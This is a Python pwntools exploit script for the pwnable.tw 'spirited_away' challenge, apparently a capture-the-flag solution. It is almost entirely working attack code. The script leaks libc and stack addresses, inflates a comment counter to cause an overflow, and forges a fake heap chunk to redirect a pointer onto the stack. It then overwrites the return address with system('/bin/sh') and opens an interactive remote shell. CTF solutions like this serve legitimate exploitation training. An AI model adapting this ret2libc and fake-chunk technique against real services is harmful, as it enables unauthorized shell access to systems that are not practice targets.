# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './spirited_away'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10204'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)

def customer(name, age, reason, comment):
    ru("\nPlease enter your name: ")
    sl(name)
    ru("Please enter your age: ")
    se(str(age))
    ru("Why did you came to see this movie? ")
    se(reason)
    ru("Please enter your comment: ")
    se(comment)

    
ru("movie!")

customer("Mask", '+\n', '1'*0x38, "comment\x00\n")
ru("Age: ")
t = int(ru('\n')) & 0xffffffff
libc.address = t - 0x1b2d60
ru('1'*0x38)
stack = un32(rn(4)) - 0x68
print hex(stack)
#print hex(libc.address)
sla("<y/n>: ", 'y')

for i in range(100):
    customer("Mask", "20\n", "reason\x00\n", "comment\n\x00")
    sla("Would you like to leave another comment? <y/n>: ", 'y')

change_ptr = '\xaa' * 0x54 + p32(stack)
fake_chunk = p32(0) + p32(0X41) + '\x01' * 0x38 + p32(0x21) * 2
#dbg("b*0x0804873E")
#sla("Would you like to leave another comment? <y/n>: ", 'y')
#sla("Would you like to leave another comment? <y/n>: ", 'y')
print "____"
sla("name: ", "Mask")
sea("movie? ", fake_chunk)
# dbg("b*0x080488C9")
sea("comment: ", change_ptr)
sla(">:", "y")
payload = 'a' * 0x4c
payload += p32(libc.symbols['system']) + p32(0) + p32(next(libc.search("/bin/sh")))
sla("name: ", payload)
# dbg("b*0x0804875E")
success(hex(libc.address))
success(hex(next(libc.search("/bin/sh"))))
success(hex(t))
shell()
